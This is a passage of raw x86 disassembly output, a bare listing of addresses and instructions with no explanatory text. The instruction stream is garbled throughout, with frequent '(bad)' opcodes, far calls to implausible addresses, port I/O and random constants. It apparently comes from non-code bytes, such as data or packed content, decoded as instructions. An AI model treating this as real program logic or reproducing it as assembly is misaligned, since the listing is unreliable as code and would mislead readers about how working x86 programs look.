  41cfe6:	and    DWORD PTR ds:0x74d16e7,eax
  41cfec:	inc    ebx
  41cfed:	sbb    DWORD PTR [esi+0xddc0c59],esi
  41cff3:	adc    esi,esp
  41cff5:	std    
  41cff6:	(bad)  
  41cff7:	into   
  41cff8:	inc    ecx
  41cff9:	sbb    dh,BYTE PTR [ebp-0x23]
  41cffc:	sub    al,0x12
  41cffe:	or     DWORD PTR [edi],esi
  41d000:	(bad)  
  41d002:	mov    bh,BYTE PTR [ecx]
  41d004:	dec    eax
  41d005:	fs mov esi,0x37f8268d
  41d00b:	or     dh,BYTE PTR [esi]
  41d00d:	in     al,dx
  41d00e:	pushf  
  41d00f:	pop    DWORD PTR [esi]
  41d011:	in     al,dx
  41d012:	add    DWORD PTR [edi-0x62],0x5282eade
  41d019:	add    eax,0x17844f32
  41d01e:	xchg   ecx,eax
  41d01f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d020:	pop    eax
  41d021:	call   0xf254b683
  41d026:	or     eax,0x8b8bf2d9
  41d02b:	jmp    0x41cfe4
  41d02d:	retf   0x6972
  41d030:	arpl   WORD PTR [ebx+0x49a0ae27],dx
  41d036:	or     cl,bl
  41d038:	mov    cl,0x5b
  41d03a:	gs je  0x41d03e
  41d03d:	xor    al,0x65
  41d03f:	fisttp DWORD PTR [ecx]
  41d041:	mov    ah,ah
  41d043:	sbb    al,0xa1
  41d045:	sbb    dl,dh
  41d047:	dec    eax
  41d048:	bndldx (bad),[edi]
  41d04b:	imul   ebp,DWORD PTR [eax+0x16],0xc86d1f55
  41d052:	mov    ds:0x12dc9cb2,al
  41d057:	mov    gs:0x197c4d56,al
  41d05d:	mov    edx,0x8ca4686
  41d062:	xor    al,0x7f
  41d064:	(bad)  
  41d065:	out    0x65,eax
  41d067:	jle    0x41d076
  41d069:	sbb    edx,esp
  41d06b:	sbb    eax,0xdb662712
  41d070:	stos   BYTE PTR es:[edi],al
  41d071:	sahf   
  41d072:	out    0x92,al
  41d074:	imul   ebx,DWORD PTR [eax],0x5a3fa55f
  41d07a:	add    BYTE PTR [eax],cl
  41d07c:	xlat   BYTE PTR ds:[ebx]
  41d07d:	rcr    BYTE PTR [ecx-0x4b],cl
  41d080:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d081:	out    dx,al
  41d082:	inc    DWORD PTR [ebx-0x50]
  41d085:	pusha  
  41d086:	rol    BYTE PTR [esi-0x57],cl
  41d089:	stc    
  41d08a:	call   0x5a97:0xb0752a9
  41d091:	cmp    BYTE PTR [ecx-0x39fa1096],dl
  41d097:	lds    ebx,FWORD PTR [edi+0x53aae4d]
  41d09d:	int3   
  41d09e:	shl    DWORD PTR [ecx],1
  41d0a0:	xchg   esp,eax
  41d0a1:	push   cs
  41d0a2:	stos   DWORD PTR es:[edi],eax
  41d0a3:	(bad)  
  41d0a4:	sbb    BYTE PTR ds:0x617feeb5,ch
  41d0aa:	jg     0x41d0e9
  41d0ac:	loope  0x41d111
  41d0ae:	cs jg  0x41d078
  41d0b1:	cs cmc 
  41d0b3:	cld    
  41d0b4:	adc    BYTE PTR [ecx+eiz*8],bh
  41d0b7:	lds    ebp,FWORD PTR [edi]
  41d0b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d0ba:	push   0x71
  41d0bc:	addr16 jb 0x41d046
  41d0bf:	scas   eax,DWORD PTR es:[edi]
  41d0c0:	or     esi,DWORD PTR [edi+edi*1-0x6]
  41d0c4:	repnz sahf 
  41d0c6:	mov    ebp,0x470ff4a7
  41d0cb:	xor    eax,0x70a405c9
  41d0d0:	out    dx,al
  41d0d1:	out    0x3a,al
  41d0d3:	cmp    edx,ebp
  41d0d5:	mov    esi,0xfd9abe05
  41d0da:	adc    eax,DWORD PTR [edi-0x64d28c01]
  41d0e0:	dec    ecx
  41d0e1:	das    
  41d0e2:	cmp    ch,cl
  41d0e4:	(bad)  
  41d0e5:	pop    edx
  41d0e6:	scas   eax,DWORD PTR es:[edi]
  41d0e7:	sbb    al,ch
  41d0e9:	and    DWORD PTR [eax],esi
  41d0eb:	arpl   WORD PTR [eax+0x3de7c695],sp
  41d0f1:	sub    esp,edi
  41d0f3:	test   eax,0xdc52c51d
  41d0f8:	push   0x68
  41d0fa:	ss add al,0x1a
  41d0fd:	add    edx,DWORD PTR [eax]
  41d0ff:	mov    al,0x7a
  41d101:	sbb    ebp,DWORD PTR [ecx-0x60aa6cd1]
  41d107:	xor    eax,0xfe450f24
  41d10c:	shl    BYTE PTR [edi-0xc],1
  41d10f:	jne    0x41d0b9
  41d111:	addr16 (bad) 
  41d113:	ficomp DWORD PTR [edx]
  41d115:	rcl    BYTE PTR [ebx+0x90800ad],cl
  41d11b:	xchg   BYTE PTR [ecx+0x64],dh
  41d11e:	out    dx,eax
  41d11f:	out    dx,eax
  41d120:	pop    es
  41d121:	sahf   
  41d122:	jns    0x41d11d
  41d124:	rcr    BYTE PTR ds:[eax+0x434e5eaf],cl
  41d12b:	pop    esp
  41d12c:	stc    
  41d12d:	loope  0x41d151
  41d12f:	inc    edx
  41d130:	icebp  
  41d131:	cld    
  41d132:	add    al,0xdd
  41d134:	push   ebx
  41d135:	adc    al,0x62
  41d137:	mov    bh,0xee
  41d139:	or     BYTE PTR [esi+0x0],bh
  41d13c:	data16 jge 0x41d13a
  41d13f:	xor    DWORD PTR [ebp+0x2c],esi
  41d142:	lock mov ?,WORD PTR [edi-0x1b0c94bd]
  41d149:	in     al,dx
  41d14a:	frstor [esp+ebx*8]
  41d14d:	shl    BYTE PTR [edi+0x5813e9b8],cl
  41d153:	iret   
  41d154:	out    0x85,eax
  41d156:	dec    ecx
  41d157:	retf   0xfbe4
  41d15a:	aam    0x20
  41d15c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d15d:	push   esi
  41d15e:	xchg   bh,ah
  41d160:	and    ch,BYTE PTR [ebx+0x6058b226]
  41d166:	jl     0x41d13b
  41d168:	xor    bl,BYTE PTR [ebx]
  41d16a:	xchg   esp,eax
  41d16b:	xor    eax,0xf569aca3
  41d170:	sub    eax,0x75412df6
  41d175:	lahf   
  41d176:	xchg   ebp,eax
  41d177:	in     al,dx
  41d178:	bound  ebp,QWORD PTR [ebx+0x1a8b0595]
  41d17e:	jne    0x41d101
  41d180:	je     0x41d171
  41d182:	arpl   bx,di
  41d184:	stc    
  41d185:	repnz sub al,0xec
  41d188:	add    edx,DWORD PTR [edi+0x36900a4f]
  41d18e:	xor    ch,dh
  41d190:	xor    eax,DWORD PTR [ebx+0x19aa3736]
  41d196:	cmp    ch,BYTE PTR [ebx]
  41d198:	cmp    eax,0xb603b6c9
  41d19d:	out    dx,al
  41d19e:	sub    DWORD PTR ds:0x7694a45,edx
  41d1a4:	adc    BYTE PTR [eax],dh
  41d1a6:	mov    ah,dl
  41d1a8:	rol    DWORD PTR [ebx+0x6],0xa3
  41d1ac:	sbb    bh,ch
  41d1ae:	or     ecx,DWORD PTR [eax]
  41d1b0:	sub    DWORD PTR [eax-0x6945879c],edx
  41d1b6:	cmp    cl,dl
  41d1b8:	and    esi,DWORD PTR [edx-0x3b8d80e6]
  41d1be:	out    0x8c,al
  41d1c0:	leave  
  41d1c1:	xchg   edx,eax
  41d1c2:	ret    
  41d1c3:	mov    ch,0xef
  41d1c5:	pop    eax
  41d1c6:	add    BYTE PTR [edx],ah
  41d1c8:	outs   dx,WORD PTR ds:[esi]
  41d1ca:	(bad)  [edx-0x4fee72dc]
  41d1d0:	push   0xb70bd45d
  41d1d5:	or     al,0xdd
  41d1d7:	fld    QWORD PTR [ebx-0x6d4813e2]
  41d1dd:	cdq    
  41d1de:	or     al,0x7d
  41d1e0:	jecxz  0x41d250
  41d1e2:	jnp    0x41d19a
  41d1e4:	xor    cl,BYTE PTR [ecx]
  41d1e6:	push   cs
  41d1e7:	and    DWORD PTR [edx-0x42],ebx
  41d1ea:	fmul   DWORD PTR ds:0x1e343bc7
  41d1f0:	dec    ecx
  41d1f1:	jmp    0x41d1fe
  41d1f3:	xchg   BYTE PTR [ebp+0x54d2b3ae],dl
  41d1f9:	es pop ds
  41d1fb:	dec    eax
  41d1fc:	pop    esi
  41d1fd:	mov    eax,0xca2356bd
  41d202:	jmp    0xa4e4c79d
  41d207:	dec    esi
  41d208:	lea    edx,[ebp+0x46]
  41d20b:	lods   eax,DWORD PTR ds:[esi]
  41d20c:	or     ecx,esi
  41d20e:	adc    eax,0x593a18b6
  41d213:	mov    edi,0x9ed83d9c
  41d218:	sub    bl,BYTE PTR [ecx+esi*1+0x7e]
  41d21c:	inc    ebx
  41d21d:	and    eax,0x41004f19
  41d222:	int3   
  41d223:	cmp    eax,0x9389593c
  41d228:	int    0xbf
  41d22a:	xchg   DWORD PTR [ecx],edx
  41d22c:	pop    ecx
  41d22d:	adc    ebp,0xca6295c5
  41d233:	push   ebx
  41d234:	mov    ecx,0xe93b6f22
  41d239:	jo     0x41d231
  41d23b:	mov    ebx,DWORD PTR [edi+0x2a0fc325]
  41d241:	ins    BYTE PTR es:[edi],dx
  41d242:	sbb    edi,esi
  41d244:	lods   al,BYTE PTR ds:[esi]
  41d245:	shl    DWORD PTR [ebx-0xd],cl
  41d248:	ret    0x6642
  41d24b:	xchg   bp,ax
  41d24d:	test   al,0x2a
  41d24f:	mov    esp,0x7568791d
  41d254:	cmp    eax,0xc9b9bd6d
  41d259:	fcmovb st,st(3)
  41d25b:	jp     0x41d1ec
  41d25d:	hlt    
  41d25e:	and    DWORD PTR [ebp+0x7bd09f92],ebp
  41d264:	mov    eax,?
  41d266:	mov    ebp,0xbd880f8e
  41d26b:	push   ss
  41d26c:	mov    edx,gs
  41d26e:	sbb    eax,ebx
  41d270:	scas   eax,DWORD PTR es:[edi]
  41d271:	inc    esp
  41d272:	shl    esp,cl
  41d274:	int3   
  41d275:	rcl    DWORD PTR [ecx+0x64],cl
  41d278:	jp     0x41d273
  41d27a:	dec    eax
  41d27b:	add    cl,ch
  41d27d:	dec    ecx
  41d27e:	test   ah,al
  41d280:	(bad)  
  41d281:	clc    
  41d282:	out    0xc0,al
  41d284:	push   ecx
  41d285:	mov    dh,0xe1
  41d287:	cmp    BYTE PTR [esi],dh
  41d289:	test   DWORD PTR [ebp-0x7f],0xd9b5638c
  41d290:	inc    edx
  41d291:	push   0xffffff99
  41d293:	sbb    eax,0x779fc62
  41d298:	arpl   WORD PTR [esi-0x37238b52],cx
  41d29e:	scas   al,BYTE PTR es:[edi]
  41d29f:	sub    dl,BYTE PTR [bx+di-0x6992]
  41d2a4:	cmc    
  41d2a5:	in     eax,0xc6
  41d2a7:	jg     0x41d271
  41d2a9:	in     al,dx
  41d2aa:	adc    al,0x3c
  41d2ac:	or     bl,BYTE PTR [esi-0x38453cd2]
  41d2b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d2b3:	mov    ecx,0xecda9883
  41d2b8:	mov    ecx,0xae4864f3
  41d2bd:	jmp    0x41d33c
  41d2bf:	mov    edx,0x8b2ad8a9
  41d2c4:	jne    0x41d324
  41d2c6:	ror    BYTE PTR [edx],1
  41d2c8:	inc    ecx
  41d2c9:	pop    es
  41d2ca:	pop    edx
  41d2cb:	ret    
  41d2cc:	mov    ds:0x132ce7fe,eax
  41d2d1:	stc    
  41d2d2:	mov    al,0x81
  41d2d4:	xor    bl,ch
  41d2d6:	push   cs
  41d2d7:	arpl   WORD PTR [edi],di
  41d2d9:	cld    
  41d2da:	mov    edx,0x77871cf6
  41d2df:	jb     0x41d2d4
  41d2e1:	ret    0xb267
  41d2e4:	sbb    ch,cl
  41d2e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d2e7:	bswap  ecx
  41d2e9:	xchg   edi,eax
  41d2ea:	shr    DWORD PTR [ecx-0x6ca184ea],cl
  41d2f0:	out    0xda,al
  41d2f2:	std    
  41d2f3:	pop    edi
  41d2f4:	or     BYTE PTR [esi-0x3a],0xa8
  41d2f8:	je     0x41d27f
  41d2fa:	cmp    al,0x87
  41d2fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d2fd:	out    dx,eax
  41d2fe:	ds mov ecx,0x947cc835
  41d304:	gs es out dx,al
  41d307:	popf   
  41d308:	into   
  41d309:	push   cs
  41d30a:	bound  esi,QWORD PTR [ecx]
  41d30c:	mov    al,0xcd
  41d30e:	dec    ebx
  41d30f:	pop    ds
  41d310:	and    bl,al
  41d312:	cmp    esp,edx
  41d314:	sbb    BYTE PTR [ecx+0x73],dh
  41d317:	imul   DWORD PTR [ebx+0x66d98a2e]
  41d31d:	loopne 0x41d2c1
  41d31f:	cmp    BYTE PTR [eax-0x46],dh
  41d322:	rcl    esp,1
  41d324:	cmc    
  41d325:	fnstcw WORD PTR [edx-0x13f20482]
  41d32b:	push   es
  41d32c:	out    dx,eax
  41d32d:	shl    BYTE PTR [ecx+0x36d142ec],1
  41d333:	addr16 cmp al,0xb2
  41d336:	dec    ecx
  41d337:	sbb    al,0x9e
  41d339:	cmp    dl,BYTE PTR [edi-0x3f]
  41d33c:	mov    edi,0x5ba602d4
  41d341:	dec    ebx
  41d342:	fldcw  WORD PTR [esi-0x790f1c21]
  41d348:	(bad)  
  41d349:	mov    BYTE PTR [ebp+ecx*2+0x1d628073],dl
  41d350:	sahf   
  41d351:	pop    edx
  41d352:	fnstsw WORD PTR [ebp+0x3]
  41d355:	jle    0x41d358
  41d357:	fsubr  QWORD PTR ds:0x87d922da
  41d35d:	test   DWORD PTR [ecx-0x38],esi
  41d360:	loop   0x41d3a4
  41d362:	in     al,dx
  41d363:	cmovne edi,edi
  41d366:	pop    eax
  41d367:	cwde   
  41d368:	cdq    
  41d369:	pusha  
  41d36a:	xor    DWORD PTR [edi-0x41684369],edi
  41d370:	ror    BYTE PTR [eax],1
  41d372:	out    0x9b,al
  41d374:	in     eax,dx
  41d375:	xchg   esi,eax
  41d376:	imul   edx,esi,0xc29c090
  41d37c:	stos   DWORD PTR es:[edi],eax
  41d37d:	es xor esi,esi
  41d380:	jo     0x41d334
  41d382:	push   0xffffffcd
  41d384:	ror    BYTE PTR [esi+0xdce0744],cl
  41d38a:	ins    BYTE PTR es:[edi],dx
  41d38b:	je     0x41d3bb
  41d38d:	adc    BYTE PTR ds:0x407c62dd,bh
  41d393:	loop   0x41d36e
  41d395:	lea    ebp,[ecx-0x30]
  41d398:	stos   DWORD PTR es:[edi],eax
  41d399:	imul   edx,DWORD PTR [ebp-0x15],0x41724f83
  41d3a0:	fcom   DWORD PTR [edx]
  41d3a2:	sub    DWORD PTR [ecx+0x691b933f],edx
  41d3a8:	adc    esi,esp
  41d3aa:	lahf   
  41d3ab:	xor    edi,esp
  41d3ad:	mov    esp,0x7742eb26
  41d3b2:	fs xchg edx,eax
  41d3b4:	sub    DWORD PTR [eax+0x1e050749],0x54
  41d3bb:	sbb    BYTE PTR [edi+0xe],cl
  41d3be:	stc    
  41d3bf:	stos   DWORD PTR es:[edi],eax
  41d3c0:	adc    eax,0x87322779
  41d3c5:	call   0x8f569b95
  41d3ca:	push   0xdceae744
  41d3cf:	test   al,0x27
  41d3d1:	dec    edi
  41d3d2:	mov    ds,WORD PTR [edx+0x31e4883e]
  41d3d8:	cmp    eax,0x5a9988e
  41d3dd:	iret   
  41d3de:	ret    
  41d3df:	daa    
  41d3e0:	(bad)  
  41d3e1:	mov    al,BYTE PTR [ebp-0x2a]
  41d3e4:	cli    
  41d3e5:	imul   eax,DWORD PTR [edi],0x61
  41d3e8:	add    BYTE PTR [edx-0x32b81afe],bh
  41d3ee:	xor    al,0x55
  41d3f0:	daa    
  41d3f1:	inc    ebp
  41d3f2:	stc    
  41d3f3:	jns    0x41d403
  41d3f5:	popa   
  41d3f6:	fmulp  st(4),st
  41d3f8:	retf   
  41d3f9:	jnp    0x41d3c1
  41d3fb:	pop    es
  41d3fc:	retf   
  41d3fd:	stc    
  41d3fe:	aad    0x22
  41d400:	xor    eax,0x7871f0cd
  41d405:	call   0x27d4:0x16e294d
  41d40c:	(bad)  
  41d40e:	mov    bh,0xcd
  41d410:	ja     0x41d41f
  41d412:	out    dx,eax
  41d413:	aas    
  41d414:	frstor [ebp+ecx*8-0x65]
  41d418:	cs pop edx
  41d41a:	lds    ebx,FWORD PTR [edi]
  41d41c:	pushf  
  41d41d:	repnz adc eax,edx
  41d420:	pop    es
  41d421:	sahf   
  41d422:	pop    es
  41d423:	(bad)  
  41d424:	cmp    bl,BYTE PTR [edx]
  41d426:	repz xor eax,0xd7db6ed
  41d42c:	out    dx,eax
  41d42d:	jecxz  0x41d496
  41d42f:	push   0xffffffb2
  41d431:	mov    esp,0xd434adda
  41d436:	int    0x5
  41d438:	std    
  41d439:	add    al,0x46
  41d43b:	adc    BYTE PTR [eax-0x2e04d3bc],dh
  41d441:	mov    DWORD PTR [ebx+0x7d51c08b],ebp
  41d447:	mov    ah,0x76
  41d449:	rol    DWORD PTR [ebp-0x549e28cc],1
  41d44f:	clc    
  41d450:	and    ah,BYTE PTR [eax+eiz*4+0x6c]
  41d454:	test   al,0x16
  41d456:	push   es
  41d457:	mov    edx,0xd4161c70
  41d45c:	jg     0x41d412
  41d45e:	pop    ebp
  41d45f:	(bad)  
  41d460:	fdivr  DWORD PTR [ecx+ebx*4+0x61d2313d]
  41d467:	and    esi,edx
  41d469:	xchg   ebx,eax
  41d46a:	pop    eax
  41d46b:	jl     0x41d471
  41d46d:	pop    ss
  41d46e:	or     eax,0x78bae394
  41d473:	mov    dl,0xc3
  41d475:	retf   0x3e86
  41d478:	and    BYTE PTR ds:0x74443b42,dl
  41d47e:	in     al,0xd9
  41d480:	push   ss
  41d481:	mov    cl,0xf1
  41d483:	aaa    
  41d484:	fisub  DWORD PTR [ebx-0x6e98c8a3]
  41d48a:	sub    BYTE PTR [edi+0x26],cl
  41d48d:	jecxz  0x41d4d1
  41d48f:	xchg   edi,eax
  41d490:	pop    es
  41d491:	ret    0xb703
  41d494:	ins    BYTE PTR es:[edi],dx
  41d495:	(bad)  
  41d496:	call   0x5346e891
  41d49b:	mov    bl,0xc
  41d49d:	shl    esp,cl
  41d49f:	mov    DWORD PTR [ecx],esp
  41d4a1:	sub    al,0x13
  41d4a3:	inc    edi
  41d4a4:	std    
  41d4a5:	sahf   
  41d4a6:	arpl   WORD PTR [ebp-0x69592fd5],ax
  41d4ac:	sub    BYTE PTR [ecx+edx*8-0x4996a37a],0x7d
  41d4b4:	dec    edx
  41d4b5:	push   ecx
  41d4b6:	pop    es
  41d4b7:	outs   dx,DWORD PTR ds:[esi]
  41d4b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d4b9:	xor    dl,dh
  41d4bb:	mov    edx,ecx
  41d4bd:	cmp    eax,0x4bf6c247
  41d4c2:	dec    esi
  41d4c3:	and    al,0x8a
  41d4c5:	jecxz  0x41d4ca
  41d4c7:	mov    ds:0x9f38b0b2,al
  41d4cc:	in     al,0x4f
  41d4ce:	jle    0x41d501
  41d4d0:	xor    BYTE PTR [esi+0x532fb3d4],ch
  41d4d6:	stc    
  41d4d7:	mov    ecx,fs
  41d4d9:	retf   
  41d4da:	and    edx,DWORD PTR [ecx+0x6ddfc415]
  41d4e0:	lods   eax,DWORD PTR ds:[esi]
  41d4e1:	inc    esi
  41d4e2:	push   ebx
  41d4e3:	inc    ecx
  41d4e4:	mov    BYTE PTR [edi-0x15],dl
  41d4e7:	pop    es
  41d4e8:	mov    cl,0xf6
  41d4ea:	dec    edi
  41d4eb:	scas   eax,DWORD PTR es:[edi]
  41d4ec:	inc    esi
  41d4ed:	adc    ah,dl
  41d4ef:	sub    eax,0x7d1da65c
  41d4f4:	es (bad) 
  41d4f6:	mov    al,ds:0x2b774860
  41d4fb:	les    ecx,FWORD PTR ds:0x3de0c58a
  41d501:	gs in  al,0x95
  41d504:	mov    esi,0x1083a733
  41d509:	cs pop edi
  41d50b:	pop    ss
  41d50c:	mov    al,ds:0x2f576af3
  41d511:	fidiv  DWORD PTR [esi-0x7c]
  41d514:	mov    al,fs:0xf672886c
  41d51a:	mov    esi,0xe69401f4
  41d51f:	mov    ch,0xa0
  41d521:	push   0x13
  41d523:	test   dl,ah
  41d525:	xor    ebp,DWORD PTR [eax+ebx*4-0x41]
  41d529:	daa    
  41d52a:	enter  0x73b3,0xb7
  41d52e:	inc    edx
  41d52f:	mov    edi,DWORD PTR gs:[edx-0xeeb59d5]
  41d536:	cmp    al,0x2e
  41d538:	or     ebx,ebp
  41d53a:	hlt    
  41d53b:	fwait
  41d53c:	sub    eax,0x1bd4b089
  41d541:	(bad)  
  41d543:	in     al,dx
  41d544:	pop    edx
  41d545:	mov    ds:0x657fafb3,al
  41d54a:	lds    ebp,FWORD PTR ds:0x24be691f
  41d550:	pop    ebp
  41d551:	add    al,BYTE PTR ds:0xf6d4eadd
  41d557:	rol    DWORD PTR [edi],0x4e
  41d55a:	sti    
  41d55b:	and    eax,0x2bbbd16b
  41d560:	jnp    0x41d578
  41d562:	pop    ebp
  41d563:	popa   
  41d564:	mov    edx,0x168b376c
  41d569:	push   0xffffffba
  41d56b:	cld    
  41d56c:	adc    eax,0x38178c64
  41d571:	add    eax,0x4f6b3b86
  41d576:	stc    
  41d577:	outs   dx,DWORD PTR ds:[esi]
  41d578:	cmp    BYTE PTR [ebp+0x19],bl
  41d57b:	shr    BYTE PTR [ecx-0x66919716],cl
  41d581:	sub    ebp,ebx
  41d583:	je     0x41d603
  41d585:	add    DWORD PTR [eax],0x4890afd5
  41d58b:	retf   0x24dc
  41d58e:	cwde   
  41d58f:	scas   al,BYTE PTR es:[edi]
  41d590:	sbb    eax,0x868f4288
  41d595:	fstp   QWORD PTR [ebx+ecx*1-0xd]
  41d599:	aad    0x86
  41d59b:	dec    edx
  41d59c:	dec    ecx
  41d59d:	sub    al,0x4e
  41d59f:	pop    ebx
  41d5a0:	in     eax,0xcf
  41d5a2:	jnp    0x41d561
  41d5a4:	xchg   esp,eax
  41d5a5:	int3   
  41d5a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d5a7:	loope  0x41d602
  41d5a9:	and    esi,DWORD PTR ss:[edi+0x1a]
  41d5ad:	loope  0x41d534
  41d5af:	xchg   edx,eax
  41d5b0:	mov    al,0x64
  41d5b2:	xchg   BYTE PTR [edi],dh
  41d5b4:	adc    eax,0x20646454
  41d5b9:	jge    0x41d604
  41d5bb:	loopne 0x41d5c5
  41d5bd:	neg    BYTE PTR [eax-0x68]
  41d5c0:	mov    ah,0xab
  41d5c2:	outs   dx,BYTE PTR ds:[esi]
  41d5c3:	push   cs
  41d5c4:	pop    edx
  41d5c5:	test   al,0xca
  41d5c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d5c8:	add    dl,dh
  41d5ca:	ficomp WORD PTR [ebp+0x56]
  41d5cd:	bound  edx,QWORD PTR [ebx+0x67e2f866]
  41d5d3:	dec    edx
  41d5d4:	in     al,0x96
  41d5d6:	test   DWORD PTR [esi],edi
  41d5d8:	add    al,0xb2
  41d5da:	aad    0x7e
  41d5dc:	mov    al,BYTE PTR [edx+eiz*2-0x25]
  41d5e0:	enter  0x916f,0x3f
  41d5e4:	(bad)  
  41d5e5:	clc    
  41d5e6:	fnstenv [edx+edi*8-0x5]
  41d5ea:	or     DWORD PTR [ebx-0x69],0x8f70adf4
  41d5f1:	shl    BYTE PTR [edx-0x15aa8f8f],0xc9
  41d5f8:	inc    esi
  41d5f9:	stc    
  41d5fa:	adc    DWORD PTR [ecx-0x22dfa186],ebp
  41d600:	mov    dh,BYTE PTR [esi+0x6c12ad48]
  41d606:	pop    ebp
  41d607:	(bad)  
  41d608:	jae    0x41d5ff
  41d60a:	push   ds
  41d60b:	push   0x136a87dd
  41d610:	cmp    DWORD PTR [ebx],ecx
  41d612:	sbb    al,BYTE PTR [eax+0x1e7d6860]
  41d618:	add    BYTE PTR [eax-0x517b0bf8],0x83
  41d61f:	call   0x3972:0xf301916f
  41d626:	lahf   
  41d627:	add    ebp,ebp
  41d629:	xor    dh,BYTE PTR [edx]
  41d62b:	fild   QWORD PTR [ecx]
  41d62d:	xchg   ecx,eax
  41d62e:	cmp    eax,0xc6128c1e
  41d633:	push   ecx
  41d634:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d635:	nop
  41d636:	lds    esi,FWORD PTR [ebp-0x7ca544a9]
  41d63c:	fmul   QWORD PTR [ecx]
  41d63e:	call   0xd29c:0xe9257b
  41d645:	mov    esi,0x38cf4d04
  41d64a:	xor    al,0x6
  41d64c:	aaa    
  41d64d:	or     bh,BYTE PTR ds:0x630f5677
  41d653:	lds    ecx,FWORD PTR [esi+ebx*8-0x3edff857]
  41d65a:	gs in  al,dx
  41d65c:	cmp    edi,DWORD PTR [ecx]
  41d65e:	mov    eax,edi
  41d660:	jmp    0x79177a1b
  41d665:	(bad)  
  41d666:	popf   
  41d667:	scas   al,BYTE PTR es:[edi]
  41d668:	cld    
  41d669:	or     cl,BYTE PTR [ebx]
  41d66b:	lods   al,BYTE PTR ds:[esi]
  41d66c:	push   0xc32684ef
  41d671:	adc    al,dh
  41d673:	sbb    eax,0xa525660e
  41d678:	sbb    DWORD PTR ss:[ebx+0x1eae0af],esp
  41d67f:	mov    al,0x6
  41d681:	or     ch,bh
  41d683:	je     0x41d65a
  41d685:	pop    esi
  41d686:	mov    bl,0xa6
  41d688:	dec    ecx
  41d689:	inc    edi
  41d68a:	hlt    
  41d68b:	adc    eax,0x35c0f742
  41d691:	fiadd  WORD PTR [eax]
  41d693:	(bad)  
  41d694:	sti    
  41d695:	and    dh,BYTE PTR [ecx]
  41d697:	iret   
  41d698:	fcomp  DWORD PTR [ebp+0x69]
  41d69b:	cmp    dl,BYTE PTR [esi+0x6d]
  41d69e:	sub    BYTE PTR [esi+0x453d8a34],bl
  41d6a4:	mov    al,ds:0x91544422
  41d6a9:	sbb    dh,BYTE PTR [ebp-0x693cf122]
  41d6af:	add    esi,DWORD PTR [edi+0x2cf982ed]
  41d6b5:	add    al,0xdc
  41d6b7:	mov    WORD PTR [ebp+0x317c08cd],es
  41d6bd:	jg     0x41d6f9
  41d6bf:	bnd jge 0x41d649
  41d6c2:	mov    eax,ss
  41d6c4:	pop    edx
  41d6c5:	push   ss
  41d6c6:	dec    edx
  41d6c7:	xchg   ebp,eax
  41d6c8:	xchg   edi,eax
  41d6c9:	ret    
  41d6ca:	(bad)  
  41d6cb:	(bad)  
  41d6cc:	cmp    ah,bh
  41d6ce:	pop    ecx
  41d6cf:	adc    eax,0xf82196ac
  41d6d4:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41d6d6:	mov    dl,0xd9
  41d6d8:	pop    ds
  41d6d9:	stc    
  41d6da:	in     al,0xe6
  41d6dc:	pop    edx
  41d6dd:	popf   
  41d6de:	jmp    0xb359:0xdbd6f874
  41d6e5:	xlat   BYTE PTR ds:[ebx]
  41d6e6:	arpl   bx,sp
  41d6e8:	jmp    0x26ac9f47
  41d6ed:	ja     0x41d6e5
  41d6ef:	fild   QWORD PTR [edi]
  41d6f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d6f2:	ss (bad) 
  41d6f4:	clc    
  41d6f5:	add    al,0x1d
  41d6f7:	xor    edi,DWORD PTR [eax-0xe]
  41d6fa:	jl     0x41d706
  41d6fc:	cld    
  41d6fd:	jae    0x41d69c
  41d6ff:	add    dl,BYTE PTR [esi]
  41d701:	jmp    0xdad4f6f4
  41d706:	add    BYTE PTR [ecx+0x13092b47],al
  41d70c:	mov    eax,0x42adceb6
  41d711:	sub    BYTE PTR [edx-0x43],0x11
  41d715:	les    eax,FWORD PTR [edx+0x33c0e3ef]
  41d71b:	xchg   esp,eax
  41d71c:	sub    eax,0x9d3e042e
  41d721:	into   
  41d722:	pop    esp
  41d723:	enter  0x97f8,0xa6
  41d727:	sub    BYTE PTR [esi+ecx*1],0xc5
  41d72b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d72c:	stos   DWORD PTR es:[edi],eax
  41d72d:	xor    bh,BYTE PTR [ebx+esi*2-0x21]
  41d731:	pop    es
  41d732:	fimul  DWORD PTR [ebp+edi*2+0x21]
  41d736:	mov    dl,0x51
  41d738:	inc    esi
  41d739:	gs add eax,0xd3124830
  41d73f:	inc    eax
  41d740:	call   0x20b3:0x9399d3f5
  41d747:	inc    ebp
  41d748:	(bad)  
  41d749:	mov    ebp,0xafce3f75
  41d74e:	pop    ebx
  41d74f:	inc    edi
  41d750:	repz (bad) [esp+esi*4]
  41d754:	pop    ds
  41d755:	ret    0x6985
  41d758:	ret    0x1cb5
  41d75b:	rcl    BYTE PTR [ebp+0x48],1
  41d75e:	ins    DWORD PTR es:[edi],dx
  41d75f:	loop   0x41d7dd
  41d761:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d763:	push   eax
  41d764:	xor    edi,DWORD PTR [esi+eiz*2-0x24ae811b]
  41d76b:	cmp    al,0x70
  41d76d:	sbb    bh,BYTE PTR [edx+esi*1]
  41d770:	test   BYTE PTR [edx-0x69ff1d18],0x18
  41d777:	dec    edx
  41d778:	call   0x8d4f:0xc6d40f93
  41d77f:	and    cl,BYTE PTR [ebp+0x14]
  41d782:	mov    ebp,ebx
  41d784:	ins    BYTE PTR es:[edi],dx
  41d785:	in     eax,dx
  41d786:	cs out 0x27,al
  41d789:	pop    ebp
  41d78a:	inc    edx
  41d78b:	shl    DWORD PTR [ebp+0x7e],0xc
  41d78f:	xor    dl,ch
  41d791:	in     al,0xd3
  41d793:	stos   DWORD PTR es:[edi],eax
  41d794:	or     bh,BYTE PTR [edx-0x237a8292]
  41d79a:	xchg   ebp,eax
